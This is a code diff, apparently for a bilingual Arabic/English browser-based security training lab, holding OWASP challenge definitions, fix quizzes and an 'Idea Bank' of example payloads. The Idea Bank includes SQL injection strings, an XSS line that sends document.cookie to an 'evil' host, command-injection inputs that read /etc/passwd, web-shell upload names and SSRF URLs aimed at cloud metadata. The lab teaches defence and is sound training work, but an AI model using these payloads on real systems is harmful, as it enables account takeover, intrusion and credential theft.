+    scenario_ar:"«حساب أسس» يُغيّر بريدك بنموذج لا يحمل رمزاً مضادّاً لـCSRF. جهّز صفحة خبيثة تُغيّر بريد الضحية بصمت — ثم أضف الحماية.",
+    target:"csrf",
+    hint_en:"The email-change request only needs the session cookie, which the browser sends automatically. Build an auto-submitting form on another page.",
+    hint_ar:"طلب تغيير البريد يحتاج فقط كوكي الجلسة الذي يرسله المتصفح تلقائياً. ابنِ نموذجاً يُرسل تلقائياً في صفحة أخرى.",
+    fixes:[
+      {ar:"رمز مضادّ لـCSRF + SameSite", code:"verifyCsrfToken(req); cookie.SameSite='Strict'", correct:true},
+      {ar:"التحقّق من ترويسة Referer فقط", code:"if(req.referer) ok()", correct:false},
+      {ar:"طلب كلمة المرور في كل مرة", code:"askPassword()", correct:false},
+    ],
+    help:{
+      p_en:"A page you built changed the victim's email the moment they visited it — no interaction needed.",
+      p_ar:"صفحة بنيتها غيّرت بريد الضحية لحظة زيارته لها — بلا أي تفاعل.",
+      v_en:"CSRF: a state-changing request has no unpredictable token, so another site can forge it using the victim's cookie.",
+      v_ar:"CSRF: طلب يُغيّر الحالة بلا رمز غير متوقَّع، فموقع آخر يزوّره مستخدماً كوكي الضحية.",
+      s_en:"Add an anti-CSRF token the attacker's page cannot read, and set the session cookie SameSite so it is not sent cross-site.",
+      s_ar:"أضف رمزاً مضادّاً لـCSRF لا تقرؤه صفحة المهاجم، واضبط كوكي الجلسة SameSite فلا يُرسَل عبر المواقع."
+    }
+  },
+  /* ---------- L3: Security Misconfiguration ---------- */
+  {
+    id:"misconfig", lvl:"L3", icon:"⚙️", diff:"med", xp:120,
+    ar:"سوء إعداد — ملفات مكشوفة", en:"Security Misconfiguration",
+    tags:["OWASP A05","Server"],
+    scenario_en:"The 'OSOS Dev' server was deployed with developer settings left on. Find a path that exposes something it shouldn't — then harden the server.",
+    scenario_ar:"خادم «OSOS Dev» نُشر وإعدادات المطوّر ما زالت مفعّلة. اعثر على مسار يكشف ما لا يجب — ثم صلّب الخادم.",
+    target:"misconfig",
+    hint_en:"Developers forget files behind. Try paths like /.git/config, /.env, /backup.zip, or /admin.",
+    hint_ar:"المطوّرون ينسون ملفات خلفهم. جرّب مسارات مثل /.git/config أو /.env أو /backup.zip أو /admin.",
+    fixes:[
+      {ar:"تعطيل الإعدادات التطويرية وحذف الملفات المكشوفة", code:"debug=off; deny /.git /.env *.zip; dirListing=off", correct:true},
+      {ar:"إضافة كلمة مرور لصفحة /admin فقط", code:"auth('/admin')", correct:false},
+      {ar:"تغيير اسم مجلد النسخ الاحتياطي", code:"mv backup bak2", correct:false},
+    ],
+    help:{
+      p_en:"You downloaded source code, secrets, or a backup just by guessing a path the server left open.",
+      p_ar:"نزّلت كوداً مصدرياً أو أسراراً أو نسخة احتياطية بمجرّد تخمين مسار تركه الخادم مفتوحاً.",
+      v_en:"Security Misconfiguration: debug mode, directory listing, or leftover files (.git, .env, backups) are reachable in production.",
+      v_ar:"سوء إعداد أمني: وضع التصحيح أو سرد المجلدات أو ملفات متبقّية (.git، .env، نسخ احتياطية) يمكن الوصول لها في الإنتاج.",
+      s_en:"Turn off debug and directory listing, remove dev/backup files, and explicitly deny access to sensitive paths.",
+      s_ar:"أطفئ وضع التصحيح وسرد المجلدات، احذف ملفات التطوير والنسخ الاحتياطية، وامنع صراحةً الوصول للمسارات الحسّاسة."
+    }
+  },
+  /* ---------- L3: Sensitive Data Exposure ---------- */
+  {
+    id:"dataexp", lvl:"L3", icon:"🔓", diff:"med", xp:120,
+    ar:"تسريب بيانات حسّاسة", en:"Sensitive Data Exposure",
+    tags:["OWASP A02","Crypto"],
+    scenario_en:"The 'OSOS API' returns user records. Inspect the response and see what it leaks — then fix how data is stored and returned.",
+    scenario_ar:"واجهة «OSOS API» تُعيد سجلّات المستخدمين. افحص الردّ وانظر ماذا يُسرّب — ثم أصلح طريقة تخزين البيانات وإرجاعها.",
+    target:"dataexp",
+    hint_en:"Call the users endpoint and read the raw JSON. Are passwords stored or sent in plain text?",
+    hint_ar:"اطلب نقطة المستخدمين واقرأ الـJSON الخام. هل كلمات المرور مُخزّنة أو مُرسَلة بنص صريح؟",
+    fixes:[
+      {ar:"تجزئة كلمات المرور + عدم إرجاعها + تشفير النقل", code:"hash(pass,bcrypt); omit password from API; HTTPS", correct:true},
+      {ar:"ترميز الردّ بـ base64", code:"res = btoa(json)", correct:false},
+      {ar:"إخفاء آخر حرفين من كلمة المرور", code:"pass.slice(0,-2)+'**'", correct:false},
+    ],
+    help:{
+      p_en:"The API handed you other users' passwords and tokens in clear text — anyone sniffing or reading the response gets them.",
+      p_ar:"الواجهة سلّمتك كلمات مرور المستخدمين ورموزهم بنص صريح — أي شخص يلتقط أو يقرأ الردّ يحصل عليها.",
+      v_en:"Sensitive Data Exposure / Cryptographic Failures: secrets are stored or transmitted unprotected (plaintext, no hashing, no encryption).",
+      v_ar:"تسريب بيانات حسّاسة / إخفاقات تشفير: الأسرار تُخزَّن أو تُنقَل دون حماية (نص صريح، بلا تجزئة، بلا تشفير).",
+      s_en:"Hash passwords with a strong algorithm (bcrypt/argon2), never return them in responses, and encrypt data in transit (HTTPS/TLS).",
+      s_ar:"جزّئ كلمات المرور بخوارزمية قوية (bcrypt/argon2)، لا تُعِدها في الردود أبداً، وشفّر البيانات أثناء النقل (HTTPS/TLS)."
+    }
+  },
+];
+
+/* ---- rotating idea bank: real-world cases + alternative payloads per challenge ---- */
+const EXAMPLES = {
+  sqli:[
+    {t:"' OR '1'='1' --", d:"الحشو المنطقي الكلاسيكي: يجعل شرط الاستعلام صحيحاً دائماً فيتجاوز الدخول."},
+    {t:"admin'--", d:"يدخل كالمستخدم admin ويُعطّل بقية الاستعلام (بما فيه فحص كلمة المرور)."},
+    {t:"' UNION SELECT user,pass FROM users--", d:"يدمج نتائج جدول آخر في الردّ لاستخراج بيانات حسّاسة."},
+    {t:"Heartland 2008", d:"حادثة واقعية: حقن SQL سرّب أكثر من ١٣٠ مليون بطاقة دفع."},
+  ],
+  xss:[
+    {t:"<img src=x onerror=alert(document.cookie)>", d:"ينفّذ سكربتاً عبر معالج خطأ صورة — بلا وسم script."},
+    {t:"<script>fetch('//evil/'+document.cookie)<\/script>", d:"يُسرّب كوكي الجلسة لخادم المهاجم."},
+    {t:"<svg onload=alert(1)>", d:"نقطة حقن بديلة حين يُفلتَر وسم img."},
+    {t:"Samy Worm 2005", d:"حادثة: دودة XSS على MySpace أصابت مليون حساب خلال ٢٠ ساعة."},
+  ],
+  idor:[
+    {t:"id=1052 → 1053", d:"زيادة الرقم بواحد تكشف سجلّ العميل التالي."},
+    {t:"/api/user/2/profile", d:"تغيير رقم المستخدم في مسار الـAPI للوصول لملف غيرك."},
+    {t:"order=1000…9999", d:"تعداد أرقام الطلبات المتسلسلة لحصد كل الفواتير."},
+    {t:"IDOR في تطبيقات بنكية", d:"حادثة: كشف أرصدة وبيانات عملاء بتغيير معرّف فقط."},
+  ],
+  cmdi:[
+    {t:"8.8.8.8; whoami", d:"فاصل ; يبدأ أمراً جديداً بعد المضيف."},
+    {t:"8.8.8.8 && cat /etc/passwd", d:"&& يشغّل الأمر الثاني عند نجاح الأول — قراءة ملفات."},
+    {t:"$(id)", d:"تنفيذ داخل استبدال الأوامر."},
+    {t:"Shellshock 2014", d:"حادثة: ثغرة في Bash مكّنت تنفيذ أوامر عن بُعد على ملايين الخوادم."},
+  ],
+  upload:[
+    {t:"shell.php", d:"رفع كود خادم بدل صورة ثم تشغيله بزيارة رابطه."},
+    {t:"shell.php.jpg", d:"خداع الامتداد المزدوج لتجاوز فحص بسيط."},
+    {t:".htaccess", d:"تغيير طريقة معالجة الخادم للملفات المرفوعة."},
+    {t:"ثغرات رفع WordPress", d:"حادثة: إضافات ضعيفة سمحت برفع قشرات ويب واختراق خوادم."},
+  ],
+  auth:[
+    {t:"admin / admin", d:"بيانات افتراضية شائعة لم تُغيَّر."},
+    {t:"rockyou.txt", d:"قائمة أشهر كلمات المرور المسرّبة للتخمين الآلي."},
+    {t:"Credential Stuffing", d:"تجربة بيانات مسرّبة من موقع آخر على حسابات هنا."},
+    {t:"إعادة استخدام كلمات المرور", d:"حادثة: اختراقات واسعة بسبب نفس كلمة المرور عبر مواقع."},
+  ],
+  ssrf:[
+    {t:"http://169.254.169.254/", d:"عنوان البيانات الوصفية للسحابة — يسرّب مفاتيح الوصول."},
+    {t:"http://localhost/admin", d:"الوصول لخدمة داخلية محجوبة من الخارج."},
+    {t:"file:///etc/passwd", d:"إساءة مخطّطات أخرى لقراءة ملفات محلية."},
+    {t:"Capital One 2019", d:"حادثة: SSRF سرّب بيانات أكثر من ١٠٠ مليون عميل."},
+  ],
+  csrf:[
+    {t:"<form autosubmit> تغيير البريد", d:"نموذج يُرسل تلقائياً عند زيارة صفحة المهاجم."},
+    {t:"<img src=/change-email?e=evil>", d:"طلب GET مزوّر يُنفَّذ بمجرّد تحميل الصورة."},
+    {t:"تغيير كلمة المرور", d:"إجبار الضحية على ضبط كلمة مرور يعرفها المهاجم."},
+    {t:"CSRF في أجهزة الراوتر", d:"حادثة: صفحات خبيثة غيّرت إعدادات راوترات منزلية."},
+  ],
+  misconfig:[
+    {t:"/.git/config", d:"مجلد git مكشوف يسمح بتحميل الكود المصدري كاملاً."},
+    {t:"/.env", d:"ملف بيئة يحوي كلمات مرور ومفاتيح API."},
+    {t:"Directory Listing", d:"سرد المجلدات يكشف كل الملفات للتصفّح الحر."},
+    {t:"S3 Buckets مكشوفة", d:"حادثة: تسريبات ضخمة بسبب تخزين سحابي عام بالخطأ."},
+  ],
+  dataexp:[
+    {t:"password بنص صريح في الرد", d:"الواجهة تُعيد كلمات المرور دون تجزئة."},
+    {t:"JWT في localStorage", d:"رموز وصول قابلة للسرقة عبر XSS."},
+    {t:"HTTP بدون TLS", d:"بيانات تُنقل مكشوفة قابلة للالتقاط."},
+    {t:"قواعد بيانات غير مشفّرة", d:"حادثة: تسريبات بسبب تخزين حسّاس بلا تشفير."},
+  ],
+};
+const BANKIDX = {};
+function bankInner(e){ return `<code style="background:#15202c;padding:4px 9px;border-radius:6px;color:var(--gold);direction:ltr;display:inline-block;font-size:13px">${esc(e.t)}</code><p style="margin-top:8px;color:#c6d2df;font-size:14px">${e.d}</p>`; }
+function bankCard(id){
+  const ex=EXAMPLES[id]||[]; if(!ex.length) return '';
+  if(BANKIDX[id]==null) BANKIDX[id]=Math.floor(Math.random()*ex.length);
+  return `<div class="bl" style="border-right:3px solid var(--vio);background:linear-gradient(90deg,rgba(163,113,247,.08),transparent)">
+    <h4 style="color:var(--vio)">💡 بنك الأفكار · Idea Bank <span style="font-size:11px;color:var(--mut)">(<span class="bidx">${BANKIDX[id]+1}</span>/${ex.length})</span></h4>
+    <div id="bank_${id}">${bankInner(ex[BANKIDX[id]])}</div>
+    <div class="rowbtns"><button class="btn o" onclick="rotateBank('${id}')">🔄 مثال آخر · Another example</button></div></div>`;
+}
+function rotateBank(id){
+  const ex=EXAMPLES[id]||[]; if(!ex.length) return;
+  BANKIDX[id]=((BANKIDX[id]||0)+1)%ex.length;
+  const el=document.getElementById('bank_'+id); if(el) el.innerHTML=bankInner(ex[BANKIDX[id]]);
+  const bx=el&&el.parentElement.querySelector('.bidx'); if(bx) bx.textContent=BANKIDX[id]+1;
+}
+
+/* ---- intro (non-interactive foundation cards for L0/L1) ---- */
+const INTRO = [
+  {id:"i_linux",lvl:"L0",icon:"🐧",ar:"أساسيات لينكس",en:"Linux Basics",txt_ar:"الأوامر، الملفات، الصلاحيات، التنقّل في الطرفية.",txt_en:"Commands, files, permissions, moving in the terminal."},
+  {id:"i_net",lvl:"L0",icon:"🌐",ar:"أساسيات الشبكات",en:"Networking Basics",txt_ar:"IP، المنافذ، HTTP، كيف يسافر الطلب من المتصفح للخادم.",txt_en:"IP, ports, HTTP, how a request travels browser→server."},
+  {id:"i_bash",lvl:"L1",icon:"📜",ar:"سكربتات Bash",en:"Bash Scripting",txt_ar:"أتمتة المهام المتكرّرة بسكربت واحد.",txt_en:"Automate repetitive tasks with one script."},
+  {id:"i_py",lvl:"L1",icon:"🐍",ar:"بايثون للأمن",en:"Python for Security",txt_ar:"كتابة أدوات صغيرة: طلبات، تحليل، أتمتة.",txt_en:"Write small tools: requests, parsing, automation."},
+];
+
+/* ============ STATE ============ */
+let state = load();
+let cur = null;        // current challenge id
+let curTab = 0;
+let ME = null;         // identity from portal login (or null)
+let helpEnabled = true;// toggled by admin/trainer
+const TRIES = {};      // runtime attempt counter per challenge
+let stationEnter = 0;  // timestamp when current solving-station was opened
+let helpTimer = null;  // 90s reveal timer
+const HELP_STATIONS = ['discover','exploit','defend'];
+const TRY_THRESHOLD = 2;      // attempts before help unlocks
+const TIME_THRESHOLD = 90000; // or 90 seconds on the station
+function bumpTry(){
+  if(!cur) return; TRIES[cur]=(TRIES[cur]||0)+1;
+  if(TRIES[cur]>=TRY_THRESHOLD) applyHelpVisibility();
+}
+function helpUnlocked(id){
+  if(!helpEnabled || !id) return false;
+  if((TRIES[id]||0) >= TRY_THRESHOLD) return true;
+  if(stationEnter && (Date.now()-stationEnter) >= TIME_THRESHOLD) return true;
+  return false;
+}
+const params = new URLSearchParams(location.search);
+const ADMINVIEW = params.get('admin')==='1';
+function lsKey(){ return 'ososlab_'+(ME&&ME.num?ME.num:'guest'); }
+function load(){
+  try{ return JSON.parse(localStorage.getItem('ososlab')||'{}'); }catch(e){ return {}; }
+}
+let _pushT;
+function save(){
+  try{ localStorage.setItem('ososlab',JSON.stringify(state)); }catch(e){}
+  // sync to portal if a student is logged in
+  if(ME&&ME.role==='student'&&ME.num&&window.LabCloud){
+    clearTimeout(_pushT);
+    _pushT=setTimeout(()=>{ window.LabCloud.push(ME.num,{name:ME.name||'',num:ME.num,updated:Date.now(),prog:state}); },700);
+  }
+}
+/* portal login arrives (same-origin auth) */
+window.addEventListener('labauth', async e=>{
+  ME=e.detail;
+  if(ME&&ME.role==='student'&&ME.num&&window.LabCloud){
+    const remote=await window.LabCloud.pull(ME.num);
+    if(remote&&remote.prog){ // merge: keep any completed step from either side
+      Object.keys(remote.prog).forEach(id=>{ state[id]=Object.assign({},remote.prog[id],state[id]); });
+      try{ localStorage.setItem('ososlab',JSON.stringify(state)); }catch(e){}
+    }
+  }
+  if(ADMINVIEW && ME && (ME.role==='admin'||ME.role==='trainer'||ME.role==='auditor')){ renderAdmin(); }
+  else { renderSide(); if(!cur) goHome(); else if(cur&&CH.find(x=>x.id===cur)) renderChallenge(); }
+});
+window.addEventListener('labhelp', e=>{ helpEnabled=e.detail!==false; applyHelpVisibility(); });
+function applyHelpVisibility(){
+  const b=document.getElementById('helpbtn'); if(!b) return;
+  const onChal = cur && CH.find(x=>x.id===cur);
+  const station = onChal ? STATIONS[curTab].k : null;
+  if(!onChal || !helpEnabled || HELP_STATIONS.indexOf(station)<0){ b.style.display='none'; return; }
+  if(helpUnlocked(cur)){
+    b.className='helpbtn'; b.style.display='flex';
+    b.onclick=openHelp; b.innerHTML='🆘 تورطت؟ ساعدني';
+  } else {
+    // locked pill — visible but muted, cannot open help yet
+    b.className='helpbtn locked-pill'; b.style.display='flex';
+    b.onclick=()=>toast('🔒 حاول أولاً — المساعدة تُفتح بعد محاولتين أو بعد قليل.',true);
+    b.innerHTML='🔒 المساعدة تُفتح بعد أن تحاول';
+  }
+}
+function prog(id){ return state[id] || {}; }
+function setStep(id,step){ state[id]=Object.assign({},state[id],{[step]:true}); save(); }
+
+const RANKS=[[0,"مبتدئ"],[200,"متدرّب"],[450,"مخترق أخلاقي"],[700,"مدافع"],[900,"محترف أمن"],[1100,"خبير أسس"]];
+function totalXP(){
+  let x=0; CH.forEach(c=>{ const p=prog(c.id); if(p.exploited&&p.defended&&p.reported){ const pen=Math.min(0.3,0.1*(p.helpTier||0)); x+=Math.round(c.xp*(1-pen)); } }); return x;
+}
+function maxXP(){ return CH.reduce((a,c)=>a+c.xp,0); }
+function rankOf(x){ let r=RANKS[0][1]; RANKS.forEach(([t,n])=>{ if(x>=t) r=n; }); return r; }
+function chalDone(id){ const p=prog(id); return !!(p.exploited&&p.defended&&p.reported); }
+/* ordered list of levels that actually contain challenges */
+function chalLevels(){ return LEVELS.map(l=>l.id).filter(id=>CH.some(c=>c.lvl===id)); }
+/* a level is unlocked when ALL challenges in every earlier challenge-level are complete */
+function levelUnlocked(lvlId){
+  const order=chalLevels(); const idx=order.indexOf(lvlId);
+  if(idx<=0) return true;
+  for(let i=0;i<idx;i++){ const done=CH.filter(c=>c.lvl===order[i]).every(c=>chalDone(c.id)); if(!done) return false; }
+  return true;
+}
+function prevLevelName(lvlId){ const order=chalLevels(); const idx=order.indexOf(lvlId); if(idx<=0) return ''; const L=LEVELS.find(l=>l.id===order[idx-1]); return L?L.ar:''; }
+function allComplete(){ return CH.every(c=>chalDone(c.id)); }
+
+/* ============ RENDER: sidebar ============ */
+function renderSide(){
+  const s=document.getElementById('side'); let h='';
+  LEVELS.forEach(L=>{
+    const items=[...INTRO.filter(i=>i.lvl===L.id),...CH.filter(c=>c.lvl===L.id)];
+    if(!items.length) return;
+    const lu=levelUnlocked(L.id);
+    h+=`<div class="lvl"><h4><span>${L.ar} ${(!lu)?'🔒':''}</span><span class="en">${L.en}</span></h4>`;
+    items.forEach(it=>{
+      const isCh=!!it.target; const p=prog(it.id);
+      const complete=isCh&&p.exploited&&p.defended&&p.reported;
+      const locked=isCh&&!lu;
+      const st=locked?'<span class="st">🔒</span>':complete?'<span class="st">✅</span>':isCh&&(p.exploited||p.defended)?'<span class="st">🔸</span>':isCh?'<span class="st" style="color:var(--mut)">○</span>':'<span class="st" style="color:var(--mut)">📖</span>';
+      const dd=isCh&&!locked?`<span class="diffdot d-${it.diff}"></span>`:'';
+      h+=`<div class="chal ${cur===it.id?'active':''} ${locked?'locked':''}" onclick="open_('${it.id}')">
+        <div class="ico">${it.icon}</div>
+        <div class="nm">${it.ar}<small>${it.en}</small></div>
+        ${dd}${st}</div>`;
+    });
+    h+='</div>';
+  });
+  s.innerHTML=h;
+}
+
+/* ============ RENDER: header xp ============ */
+function renderXP(){
+  const x=totalXP(), mx=maxXP();
+  document.getElementById('xpnum').textContent=x;
+  document.getElementById('xpbar').style.width=Math.min(100,x/mx*100)+'%';
+  document.getElementById('rankName').textContent=rankOf(x);
+}
+
+/* ============ HOME ============ */
+function goHome(){ cur=null; closeHelp(); document.getElementById('helpbtn').style.display='none'; renderSide();
+  const done=CH.filter(c=>{const p=prog(c.id);return p.exploited&&p.defended&&p.reported;}).length;
+  let cards=CH.map(c=>{
+    const p=prog(c.id); const complete=p.exploited&&p.defended&&p.reported;
+    const locked=!levelUnlocked(c.lvl);
+    return `<div class="card ${locked?'locked':''}" onclick="open_('${c.id}')" style="${locked?'opacity:.5':''}">
+      <h3>${locked?'🔒':c.icon} ${c.ar} ${complete?'<span style="color:var(--grn);font-size:13px">✓</span>':''}</h3>
+      <div class="en">${c.en}</div>
+      <p>${locked?('مقفل — أكمل «'+prevLevelName(c.lvl)+'» أولاً'):c.scenario_ar}</p>
+      <div class="foot"><span><span class="diffdot d-${c.diff}" style="display:inline-block;margin-left:5px"></span>${c.diff==='easy'?'سهل':c.diff==='med'?'متوسط':'صعب'}</span><span>${c.xp} XP</span></div>
+    </div>`;
+  }).join('');
+  const certCTA = allComplete()
+    ? `<div class="bl" style="border-color:var(--gold);background:linear-gradient(90deg,rgba(242,193,78,.1),transparent);text-align:center;margin-top:20px">
+        <h4 style="color:var(--gold)">🎓 أكملت كل التحدّيات!</h4>
+        <p style="color:#c6d2df">أنجزت المختبر بالكامل. استخرج شهادة الإتمام باسمك.</p>
+        <div class="rowbtns" style="justify-content:center"><button class="btn" style="background:var(--gold);color:#2a1e00" onclick="showCert()">🎓 عرض شهادتي</button></div></div>`
+    : '';
+  document.getElementById('main').innerHTML=`
+    <div class="hero">
+      <h1>مختبر أسس السيبراني</h1>
+      <div class="en">OSOS Cyber Lab — a hands-on lab unlike any other in the Kingdom</div>
+      <p>تدرّب على ثغرات حقيقية ضد أهداف محاكاة آمنة داخل متصفحك. كل تحدٍّ يمرّ بأربع محطّات: <b style="color:var(--cy)">اكتشف → اهجم → دافع → اكتب التقرير</b>. مستوحى من أفضل ١٠ منصّات عالمية.</p>
+      <div class="chips">
+        <span class="chip">🎯 <b>${CH.length}</b> تحدٍّ تفاعلي</span>
+        <span class="chip">✅ أنجزت <b>${done}</b></span>
+        <span class="chip">🏆 <b>${totalXP()}</b> / ${maxXP()} XP</span>
+        <span class="chip">🧪 أهداف محاكاة آمنة ١٠٠٪</span>
+      </div>
+    </div>
+    <div class="secnote">
+      <span style="font-size:20px">⚖️</span>
+      <div><b>تنبيه أخلاقي وقانوني:</b> كل الأهداف هنا محاكاة داخل المتصفح. لا توجّه أي أمر أو هجوم لأي موقع أو نظام حقيقي — فعل ذلك جريمة نظامية مهما كانت نيّتك.
+      <span class="en">All targets are simulated in your browser. Never attack a real system — it is a crime regardless of intent.</span></div>
+    </div>
+    <h3 style="margin:22px 0 14px">التحدّيات التفاعلية · Interactive Challenges</h3>
+    <div class="grid">${cards}</div>
+    ${certCTA}`;
+  renderMobileNav();
+  renderXP();
+}
+
+/* ============ OPEN CHALLENGE ============ */
+function open_(id){
+  const intro=INTRO.find(i=>i.id===id);
+  if(intro){ openIntro(intro); return; }
+  const c=CH.find(x=>x.id===id);
+  if(c && !levelUnlocked(c.lvl)){ toast('🔒 أكمل «'+prevLevelName(c.lvl)+'» أولاً لفتح هذا المستوى.',true); return; }
+  cur=id; curTab=0; closeHelp(); renderSide();
+  applyHelpVisibility();
+  renderChallenge();
+}
+function openIntro(it){
+  cur=it.id; renderSide(); document.getElementById('helpbtn').style.display='none';
+  document.getElementById('main').innerHTML=`
+    <div class="cv-head"><div class="big">${it.icon}</div>
+      <div><h2>${it.ar}</h2><div class="en">${it.en}</div>
+      <div class="badges"><span class="b">📖 تأسيس</span></div></div></div>
+    <div class="bl goal"><h4>🎓 الفكرة · The idea</h4>
+      <p>${it.txt_ar}</p><div class="en">${it.txt_en}</div></div>
+    <div class="bl"><p style="color:var(--mut)">هذه وحدة تأسيسية. الشرح الكامل خطوة بخطوة والأوامر الجاهزة للنسخ موجودة في <b style="color:var(--txt)">كتاب المتدرب العملي (٢٠٢ صفحة)</b> داخل بوابة المعهد. ابدأ بالتحدّيات التفاعلية في المستوى ٢ عندما تكون جاهزاً.</p></div>
+    <div class="rowbtns"><button class="btn o" onclick="goHome()">→ رجوع للرئيسية</button></div>`;
+}
+
+/* ============ CHALLENGE VIEW ============ */
+const STATIONS=[
+  {k:"brief", ar:"المهمة", en:"Brief", ic:"🎯"},
+  {k:"discover", ar:"اكتشف", en:"Discover", ic:"🔍"},
+  {k:"exploit", ar:"اهجم", en:"Exploit", ic:"⚔️"},
+  {k:"defend", ar:"دافع", en:"Defend", ic:"🛡️"},
+  {k:"report", ar:"التقرير", en:"Report", ic:"📝"},
+];
+function renderChallenge(){
+  const c=CH.find(x=>x.id===cur); const p=prog(c.id);
+  const tabs=STATIONS.map((s,i)=>{
+    let done='';
+    if(s.k==='exploit'&&p.exploited) done='<span class="done">✓</span>';
+    if(s.k==='defend'&&p.defended) done='<span class="done">✓</span>';
+    if(s.k==='report'&&p.reported) done='<span class="done">✓</span>';
+    return `<div class="tab ${i===curTab?'on':''}" onclick="curTab=${i};renderChallenge()">
+      ${s.ic} <span>${s.ar}<br><span class="en">${s.en}</span></span> ${done}</div>`;
+  }).join('');
+  const body=stationBody(c,p,STATIONS[curTab].k);
+  document.getElementById('main').innerHTML=`
+    <div class="cv-head"><div class="big">${c.icon}</div>
+      <div><h2>${c.ar}</h2><div class="en">${c.en}</div>
+      <div class="badges">${c.tags.map(t=>`<span class="b">${t}</span>`).join('')}
+        <span class="b"><span class="diffdot d-${c.diff}" style="display:inline-block;margin-left:5px"></span>${c.diff==='easy'?'سهل':c.diff==='med'?'متوسط':'صعب'}</span>
+        <span class="b">🏆 ${c.xp} XP</span></div></div></div>
+    <div class="tabs">${tabs}</div>
+    <div class="pane" id="pane">${body}</div>`;
+  const st=STATIONS[curTab].k;
+  if(st==='discover'||st==='exploit') mountTarget(c,st);
+  clearTimeout(helpTimer);
+  if(HELP_STATIONS.indexOf(st)>=0){ stationEnter=Date.now(); helpTimer=setTimeout(()=>applyHelpVisibility(), TIME_THRESHOLD); }
+  renderMobileNav(); applyHelpVisibility(); renderXP();
+}
+
+function stationBody(c,p,k){
+  if(k==='brief') return `
+    <div class="bl goal"><h4>🎯 المهمة · Mission</h4><p>${c.scenario_ar}</p><div class="en">${c.scenario_en}</div></div>
+    <div class="bl"><h4>📋 المحطّات الأربع</h4>
+    <p>١. <b>اكتشف</b> الهدف وافهم كيف يعمل. ٢. <b>اهجم</b> لإثبات الثغرة بأدنى فعل. ٣. <b>دافع</b> بإصلاح الجذر وأعد الاختبار. ٤. اكتب <b>التقرير</b> الفني.</p>
+    <div class="en">1. Discover · 2. Exploit (proof only) · 3. Defend (fix &amp; retest) · 4. Report</div></div>
+    ${bankCard(c.id)}
+    <div class="rowbtns"><button class="btn" onclick="curTab=1;renderChallenge()">ابدأ المهمة → اكتشف</button></div>`;
+  if(k==='discover') return `
+    <div class="bl"><h4>🔍 استكشف الهدف</h4><p>تصفّح التطبيق كمستخدم عادي. لاحظ كل خانة إدخال وكل رابط. اسأل: أين يثق النظام بي؟</p>
+    <div class="en">Browse as a normal user. Note every input. Ask: where does the system trust me?</div></div>
+    <div id="tgt"></div>
+    <div class="hintline">💡 تلميح: ${c.hint_ar} <br><span class="en" style="margin-top:4px">${c.hint_en}</span></div>
+    ${bankCard(c.id)}
+    <div class="rowbtns"><button class="btn" onclick="curTab=2;renderChallenge()">انتقل للهجوم →</button></div>`;
+  if(k==='exploit'){
+    const d=p.exploited?`<div class="bl" style="border-color:var(--grn);background:var(--grnd)"><h4 style="color:var(--grn)">✅ تم إثبات الثغرة!</h4><p>نجحت في استغلال الهدف. انتقل الآن لمحطّة الدفاع لإصلاح الجذر.</p><div class="en">Vulnerability proven. Move to Defend to fix the root cause.</div></div>`:'';
+    return `${d}
+    <div class="bl"><h4>⚔️ اهجم — إثبات فقط</h4><p>نفّذ أصغر فعل يُثبت الثغرة. لا تتجاوز الإثبات أبداً.</p>
+    <div class="en">Perform the smallest action that proves the flaw. Never go beyond proof.</div></div>
+    <div id="tgt"></div>
+    <div class="hintline">💡 ${c.hint_ar}</div>
+    ${p.exploited?`<div class="rowbtns"><button class="btn g" onclick="curTab=3;renderChallenge()">🛡️ انتقل للدفاع →</button></div>`:''}`;
+  }
+  if(k==='defend'){
+    if(!p.exploited) return `<div class="bl" style="border-color:var(--gold)"><h4 style="color:var(--gold)">🔒 أثبت الثغرة أولاً</h4><p>عد لمحطّة «اهجم» وأثبت الثغرة قبل أن تتعلّم كيف تصلحها.</p></div>
+      <div class="rowbtns"><button class="btn o" onclick="curTab=2;renderChallenge()">← رجوع للهجوم</button></div>`;
+    const opts=c.fixes.map((f,i)=>{
+      let cls=''; if(p.defendPick!=null){ if(f.correct) cls='correct'; else if(p.defendPick===i) cls='wrong'; }
+      else if(p.defendSel===i) cls='sel';
+      return `<div class="fixopt ${cls}" onclick="pickFix('${c.id}',${i})">
+        <div class="rb"></div><div style="flex:1"><b>${f.ar}</b><code>${esc(f.code)}</code></div></div>`;
+    }).join('');
+    const res=p.defended?`<div class="bl" style="border-color:var(--grn);background:var(--grnd)"><h4 style="color:var(--grn)">✅ الإصلاح صحيح وصامد</h4><p>أعدنا تشغيل هجومك ضد الكود المُصلَح — فشل الهجوم. هذا هو جوهر الدفاع: تُصلح الجذر ثم تُثبت أن الإصلاح يصمد.</p><div class="en">We re-ran your attack against the fix — it failed. You fixed the root and proved it holds.</div></div>`:'';
+    return `${res}
+    <div class="bl"><h4>🛡️ اختر الإصلاح الصحيح</h4><p>أي خيار يعالج جذر الثغرة — لا العَرَض؟ اختر ثم اضغط «طبّق وأعد الاختبار».</p>
+    <div class="en">Which option fixes the root cause, not the symptom?</div></div>
+    ${opts}
+    <div class="rowbtns">${p.defended?`<button class="btn g" onclick="curTab=4;renderChallenge()">📝 اكتب التقرير →</button>`:`<button class="btn" onclick="applyFix('${c.id}')" ${p.defendSel==null?'disabled':''}>طبّق وأعد الاختبار</button>`}</div>`;
+  }
+  if(k==='report'){
+    if(!p.defended) return `<div class="bl" style="border-color:var(--gold)"><h4 style="color:var(--gold)">🔒 أصلح الثغرة أولاً</h4><p>أكمل محطّة الدفاع قبل كتابة التقرير.</p></div>
+      <div class="rowbtns"><button class="btn o" onclick="curTab=3;renderChallenge()">← رجوع للدفاع</button></div>`;
+    if(p.reported) return `<div class="bl" style="border-color:var(--grn);background:var(--grnd)"><h4 style="color:var(--grn)">✅ التحدّي مكتمل — ${c.xp} XP</h4><p>سلّمت تقريراً كاملاً. أكملت المحطّات الأربع لهذا التحدّي. أحسنت!</p><div class="en">Full report submitted. All four stations complete. Well done!</div></div>
+      <div class="rowbtns"><button class="btn o" onclick="goHome()">🏠 الرئيسية</button><button class="btn" onclick="nextChallenge('${c.id}')">التحدّي التالي →</button></div>`;
+    return `
+    <div class="bl"><h4>📝 اكتب التقرير الفني</h4><p>اكتب للمدير (المخاطرة) وللمهندس (الخطوات والإصلاح). كن دقيقاً وصادقاً.</p>
+    <div class="en">Write for the manager (risk) and the engineer (steps + fix).</div></div>
+    <div class="rep">
+      <label>العنوان · Title</label><input id="r_title" placeholder="مثال: تجاوز المصادقة عبر حقن SQL في بوابة الموظّفين">
